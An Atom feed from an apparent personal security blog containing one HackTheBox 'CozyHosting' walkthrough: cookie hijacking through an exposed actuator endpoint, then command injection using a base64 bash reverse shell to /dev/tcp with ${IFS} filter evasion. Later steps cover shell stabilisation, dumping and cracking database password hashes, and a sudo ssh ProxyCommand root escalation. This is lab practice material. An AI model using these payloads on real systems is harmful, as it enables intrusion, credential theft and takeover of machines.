<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://your-site-url/feed.xml" rel="self" type="application/atom+xml" /><link href="https://your-site-url/" rel="alternate" type="text/html" /><updated>2025-07-19T20:20:54+00:00</updated><id>https://your-site-url/feed.xml</id><title type="html">Pwn3d777</title><subtitle>This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i&apos;ve developed
</subtitle><author><name>GitHub User</name></author><entry><title type="html">CozyHosting</title><link href="https://your-site-url/jekyll/update/2025/07/19/cozy.html" rel="alternate" type="text/html" title="CozyHosting" /><published>2025-07-19T16:05:57+00:00</published><updated>2025-07-19T16:05:57+00:00</updated><id>https://your-site-url/jekyll/update/2025/07/19/cozy</id><content type="html" xml:base="https://your-site-url/jekyll/update/2025/07/19/cozy.html"><![CDATA[<h1 id="cozyhosting">CozyHosting</h1>

<p>HackTheBox: Easy</p>

<blockquote>
  <p>Cozyhosting is an Ubuntu system when you can practices technique as cookie hijacking, reverse shells, password hashing.</p>

</blockquote>

<h2 id="1-enumeration">1: Enumeration</h2>

<ul>
  <li>Check the active connection</li>
</ul>

<p><img src="/assets/images/cozyhosting/Untitled.png" alt="Untitled" /></p>

<ul>
  <li>Scanning ports</li>
</ul>

<p><img src="/assets/images/cozyhosting/Untitled%201.png" alt="Untitled" /></p>

<p>We can see there’s a web services running in 80 port and ssh service in 22 port it could be a way to get in later.</p>

<ul>
  <li>Dirsearch looking for enable directories</li>
</ul>

<p><img src="/assets/images/cozyhosting/Untitled%202.png" alt="Untitled" /></p>

<p>Something interesting in /actuator/sessions</p>

<h2 id="2-looking-around">2: Looking around</h2>

<ul>
  <li>There is a possible cookie hijacking vulnerability.</li>
</ul>

<p><img src="/assets/images/cozyhosting/Untitled%203.png" alt="Untitled" /></p>

<ul>
  <li>We can use BurpSuite</li>
</ul>

<p><img src="/assets/images/cozyhosting/Untitled%204.png" alt="Untitled" /></p>

<ul>
  <li>We simulate the log in process and inject the cookie, we change it at the right side bar</li>
</ul>

<p><img src="/assets/images/cozyhosting/Untitled%205.png" alt="Untitled" /></p>

<p><img src="/assets/images/cozyhosting/Untitled%206.png" alt="Untitled" /></p>

<h2 id="3-user-flag">3: User flag</h2>

<ul>
  <li>It executes commands, so get can make a rev shell to get access</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1"</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nb">echo</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="s2">"&lt;your payload here&gt;"</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>|<span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="nb">base64</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="nt">-d</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>|<span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>bash<span class="p">;</span>
</code></pre></div></div>

<p>${IFS%??} For blank spaces and convert it to url format</p>

<ul>
  <li>We use nc to receive the connection and make the shell stable like this</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
ctrl + z
<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
</code></pre></div></div>

<p>We use cat etc/passwd for user</p>

<ul>
  <li>We’ve got and .jar with db credentials, using python</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 7777
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.00.000:7777/&lt;file_name&gt;
</code></pre></div></div>

<ul>
  <li>Look for creds:</li>
</ul>

<p><img src="/assets/images/cozyhosting/Untitled%207.png" alt="Untitled" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psql <span class="nt">-h</span> 127.0.0.1 <span class="nt">-U</span> postgres
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\c</span> cozyhosting
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\d</span>
<span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
</code></pre></div></div>

<p>We got the hash for admin, we solve using</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john hash.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
</code></pre></div></div>

<p>We use ssh to break into</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh josh@10.10.11.230
</code></pre></div></div>

<h2 id="4-priv-esc">4: Priv esc</h2>

<ul>
  <li>Using sudo -l</li>
</ul>

<p><img src="/assets/images/cozyhosting/Untitled%208.png" alt="Untitled" /></p>

<ul>
  <li>In <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo">https://gtfobins.github.io/gtfobins/ssh/#sudo</a> We find a way to get root access easily</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>ssh <span class="nt">-o</span> <span class="nv">ProxyCommand</span><span class="o">=</span><span class="s1">';sh 0&lt;&amp;2 1&gt;&amp;2'</span> x
</code></pre></div></div>

<p><img src="/assets/images/cozyhosting/Untitled%209.png" alt="Untitled" /></p>

<ul>
  <li>Machine pwned
<img src="/assets/images/cozyhosting/Untitled%2010.png" alt="Untitled" /></li>
</ul>]]></content><author><name>GitHub User</name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[CozyHosting]]></summary></entry></feed>